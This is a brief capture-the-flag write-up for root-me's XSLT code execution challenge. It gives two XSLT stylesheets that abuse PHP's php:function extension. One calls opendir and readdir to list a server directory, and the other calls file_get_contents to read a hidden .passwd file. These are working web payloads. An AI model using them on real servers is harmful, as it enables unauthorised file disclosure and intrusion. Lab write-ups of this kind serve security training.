# XSLT code execution

[root-me challenge XSLT - Code execution](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution): Find the vulnerability and exploit it to read the file .passwd in a subdirectory of the challenge tree.

```text
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```

![XSLT](/_static/images/rootme-xslt-code.png)

Check that `.6ff3200bee785801f420fba826ffcdee` directory too. It contains a `.passwd`.

```text
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
</xsl:template></xsl:stylesheet>
```

![XSLT](/_static/images/rootme-xslt-code2.png)
